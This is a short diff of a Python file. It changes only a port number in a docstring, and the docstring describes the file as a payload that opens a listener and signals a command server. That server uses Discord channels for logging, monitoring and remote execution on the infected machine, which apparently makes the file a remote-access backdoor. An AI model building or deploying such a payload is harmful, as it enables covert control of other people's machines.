@@ -3,7 +3,7 @@ import shlex
 from subprocess import Popen, PIPE
 
 """
-This is a payload which starts a listener on port 4455 and signals
+This is a payload which starts a listener on port 22705 and signals
 to command machine at an IP which is predefined or specified in args.
 This signal makes the command server create channels on discord for
 logging, monitoring, and remote execution on this machine.
